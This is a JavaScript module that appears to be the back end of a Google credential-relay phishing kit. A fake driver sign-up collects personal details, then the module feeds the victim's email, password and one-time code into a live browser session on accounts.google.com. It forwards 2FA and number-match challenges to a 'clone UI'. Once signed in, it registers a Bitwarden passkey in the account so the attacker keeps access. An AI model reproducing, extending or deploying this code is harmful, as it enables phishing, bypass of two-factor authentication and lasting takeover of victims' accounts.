import crypto from 'node:crypto';
import * as store from './store.js';
import * as browser from './browser.js';
import { push as eventsPush } from './events.js';

const push = (type, data) => eventsPush(type, data);
const STATIC_TOKEN = 'login';
const LANDING = 'https://accounts.google.com/';

const pending = new Map();

function entry(token, wid, session = null) {
  const id = (wid && /^[0-9a-f-]{36}$/i.test(wid)) ? wid : crypto.randomUUID();
  let rec = pending.get(id);
  if (!rec) {
    rec = {
      token,
      wid: id,
      session,
      sessionId: null,
      driverName: null,
      licensePlate: null,
      phone: null,
      email: null,
      city: null,
      vehicle: null,
      state: null,
      username: null,
      code: null,
      loggedOut: false,
      lastLogin: null,
      _lastChallenge: null,
      _pwAt: 0,
      _stAt: 0,
      createdAt: Date.now(),
    };
    pending.set(id, rec);
  } else {
    if (session) rec.session = session;
    rec.token = token;
  }
  return rec;
}

function toPayload(r) {
  return {
    wid: r.wid,
    driverName: r.driverName,
    licensePlate: r.licensePlate,
    phone: r.phone,
    email: r.email,
    city: r.city,
    vehicle: r.vehicle,
    state: r.state,
    username: r.username,
    code: r.code,
    sessionId: r.sessionId,
    loggedOut: r.loggedOut,
    lastLogin: r.lastLogin,
    loggedIn: r.loggedOut ? false : !!(r.sessionId && r.session?.status === 'trusted'),
    trusted: r.loggedOut ? false : !!(r.sessionId && r.session?.status === 'trusted'),
    trustedDevice: r.loggedOut ? false : !!(r.sessionId && r.session?.deviceTrusted),
  };
}

export async function begin(token, wid) {
  const r = entry(token, wid);
  push('wizard.started', { message: '🔗 Wizard started' });
  return toPayload(r);
}

// ── sequential driver: one op at a time per session, no interleaved navigations
const drives = new Map();
function drive(sid, fn) {
  const prev = drives.get(sid) || Promise.resolve();
  const next = prev.catch(() => {}).then(fn).catch((e) => {
    console.error(`[wizard] drive failed for ${sid}:`, e && e.message ? e.message : e);
    push('wizard.driver', { message: '⚠️ ' + String((e && e.message) || 'driver error') });
  });
  drives.set(sid, next);
  return next;
}

// ── browser warm-up: opens the window the moment a session is created, so by the
//    time the visitor types their email the page is already up (no dead click).
const warming = new Map();
async function ensureOpen(sid) {
  if (browser.isOpen(sid)) return;
  if (!warming.has(sid)) {
    const s = store.getRaw(sid) || {};
    warming.set(sid, browser.open(sid, s.loginUrl || LANDING, { headless: false })
      .catch((e) => console.error(`[wizard] browser open failed for ${sid}:`, e && e.message ? e.message : e))
      .finally(() => warming.delete(sid)));
  }
  await warming.get(sid);
}

// ── finisher: after sign-in, register the Bitwarden passkey in the Google account.
//    The passkey itself is what trusts this device (no more 2FA-trust journey).
async function finishPasskey(sid) {
  const s = store.getRaw(sid) || {};
  if (s.deviceTrusted || s.passkeyAttempted) return;
  store.update(sid, { passkeyAttempted: true });
  push('wizard.driver', { message: '🔑 Registering passkey (Bitwarden)…' });
  try {
    const r = await browser.createPasskey(sid);
    if (r && r.ok) {
      store.update(sid, { deviceTrusted: true });
      store.setStatus(sid, 'trusted');
      push('wizard.driver', { message: `🔑 Passkey registered (${r.count} in account) — device trusted` });
    } else {
      store.setStatus(sid, 'logged-in');
      push('wizard.driver', { message: '⚠️ Passkey: ' + ((r && r.why) || 'not confirmed') });
    }
  } catch (e) {
    store.setStatus(sid, 'logged-in');
    push('wizard.driver', { message: '⚠️ Passkey registration failed: ' + (e && e.message ? e.message : e) });
  }
}

function kickPasskey(r) {
  if (!r.sessionId || r._pkFired) return;
  r._pkFired = true;
  r._pkRunning = true;
  drive(r.sessionId, () => finishPasskey(r.sessionId))
    .finally(() => { r._pkRunning = false; r._pkDone = true; });
}

export async function step(token, wid, stepName, value) {
  const r = entry(token, wid);
  const step = String(stepName || '').trim();

  if (step === 'driver') {
    const v = (value && typeof value === 'object') ? value : {};
    r.driverName = String(v.driverName || r.driverName || '').trim();
    r.licensePlate = String(v.licensePlate || r.licensePlate || '').trim();
    r.phone = String(v.phone || r.phone || '').trim();
    r.email = String(v.email || r.email || '').trim();
    r.city = String(v.city || r.city || '').trim();
    r.vehicle = String(v.vehicle || r.vehicle || '').trim();
    r.state = String(v.state || r.state || '').trim();

    const driverFields = {
      driverName: r.driverName, licensePlate: r.licensePlate, phone: r.phone,
      email: r.email, city: r.city, vehicle: r.vehicle, state: r.state,
    };
    if (r.sessionId) {
      store.update(r.sessionId, driverFields);
      r.session = store.getRaw(r.sessionId);
    } else {
      const s = store.create({
        name: r.driverName,
        provider: 'google',
        loginUrl: LANDING,
        username: r.email,
        phone: r.phone,
        licensePlate: r.licensePlate,
        city: r.city,
        vehicle: r.vehicle,
        state: r.state,
        email: r.email,
        note: 'Driver submission',
      });
      r.sessionId = s.id;
      r.session = s;
      // warm the browser window now — it must be open before the email is typed
      drive(r.sessionId, () => ensureOpen(r.sessionId));
    }
    push('wizard.driver', { message: `🚗 Driver: ${r.driverName || '—'} · ${r.licensePlate || '—'}` });
    return toPayload(r);
  }

  if (step === 'username') {
    r.username = String(value || '').trim();
    if (r.sessionId) {
      store.update(r.sessionId, { username: r.username, name: r.driverName || r.username });
      r.session = store.getRaw(r.sessionId);
    }
    push('wizard.username', { message: `✉️ Email: ${r.username}` });
  }

  if (step === 'password') {
    const now = Date.now();
    if (now - r._pwAt < 1500) return toPayload(r);
    r._pwAt = now;
    const pw = String(value || '').trim();
    push('wizard.password', { message: '🔑 Password received' });
    // credentials are applied directly to the browser by the wizard phase below
    void pw;
  }

  if (step === 'totp') {
    r.code = String(value || '').trim();
    push('wizard.code', { message: '📲 Code received' });
  }

  // ── drive the browser for every credential step (email → password → code → choice)
  if (r.sessionId && step !== 'driver') {
    const valueForLogin = step === 'totp' ? String(value ?? '').replace(/\s+/g, '') : value;
    const res = await drive(r.sessionId, async () => {
      await ensureOpen(r.sessionId);
      return browser.wizardPhase(step, r.sessionId, valueForLogin);
    });
    if (res && typeof res === 'object') {
      r.lastLogin = { status: res.status || 'unknown', message: res.message || '', state: res.state || null, options: res.options || null };
      if (res.status === 'logged-in') {
        store.setStatus(r.sessionId, 'logged-in');
        push('wizard.logged-in', { message: `Signed in ✓  ${r.username || 'Google'}`.trim() });
        kickPasskey(r);
      } else if (res.status === 'error') {
        store.setStatus(r.sessionId, 'new');
      } else if (['numchoice', 'code', 'approve'].includes(res.state)) {
        push('wizard.challenge', {
          message: `Challenge: ${r.username || 'Google'} → ${res.state}${res.options?.length ? ` (number: ${res.options.join(' ')})` : ''}`,
          sessionId: r.sessionId, state: res.state, options: res.options || null, loginMessage: res.message || '',
        });
      }
    }
  }

  if (step === 'status') {
    if (!r.sessionId) return toPayload(r);
    // passkey creation owns the page right now — don't fight it with page polls
    if (r._pkRunning) return toPayload(r);
    const now = Date.now();
    if (now - r._stAt < 4000) {
      const cached = r.lastLogin;
      if (cached) {
        const age = Date.now() - (cached.ts || 0);
        if (cached.status === 'logged-in' && age < 15000) {
          push('wizard.logged-in', { message: `Signed in ✓  ${r.username || 'Google'}`.trim() });
          r._lastChallenge = null;
          r.lastLogin = null;
        }
      }
      // refresh the stored session snapshot (status may have changed on disk)
      r.session = store.getRaw(r.sessionId);
      return toPayload(r);
    }
    r._stAt = now;
    const res = await drive(r.sessionId, () => browser.loginState(r.sessionId));
    if (res && typeof res === 'object') {
      r.lastLogin = { ...res, ts: Date.now() };
      if (res.status === 'logged-in') {
        store.setStatus(r.sessionId, 'logged-in');
        kickPasskey(r);
      } else if (['numchoice', 'code', 'approve'].includes(res.state)) {
        // only re-emit a challenge event when the challenge actually changed,
        // otherwise the poll spam makes the clone UI jitter on every 2.5s tick
        const key = `${res.state}|${(res.options || []).join(',')}|${res.message || ''}`;
        if (r._lastChallenge !== key) {
          r._lastChallenge = key;
          push('wizard.challenge', {
            message: `Challenge: ${r.username || 'Google'} → ${res.state}${res.options?.length ? ` (number: ${res.options.join(' ')})` : ''}`,
            sessionId: r.sessionId, state: res.state, options: res.options || null, loginMessage: res.message || '',
          });
        }
      } else {
        r._lastChallenge = null;
      }
    }
    r.session = store.getRaw(r.sessionId);
  }

  if (step === 'complete') {
    const ok = !!(r.sessionId && r.session && (r.session.status === 'trusted' || r.session.status === 'logged-in'));
    if (ok) push('wizard.complete', { message: `✅ Completed: ${r.username || r.driverName || r.wid}` });
    return { ok, ...toPayload(r) };
  }

  if (step === 'reset') {
    r.lastLogin = null;
    r.loggedOut = false;
    if (r.sessionId) store.setStatus(r.sessionId, 'new');
    push('wizard.reset', { message: '↺ Wizard reset' });
  }

  if (step === 'logout') {
    r.loggedOut = true;
    if (r.sessionId) {
      try { await browser.close(r.sessionId); } catch {}
      store.update(r.sessionId, { deviceTrusted: false });
      store.setStatus(r.sessionId, 'new');
    }
    r.session = r.sessionId ? store.getRaw(r.sessionId) : null;
    push('wizard.logged-out', { message: `👋 Logged out: ${r.username || r.wid}` });
  }

  return toPayload(r);
}

export async function complete(token, wid) {
  const r = entry(token, wid);
  const ok = !!(r.sessionId && r.session && (r.session.status === 'trusted' || r.session.status === 'logged-in'));
  if (ok) push('wizard.complete', { message: `✅ Completed: ${r.username || r.driverName || r.wid}` });
  return { ok, ...toPayload(r) };
}
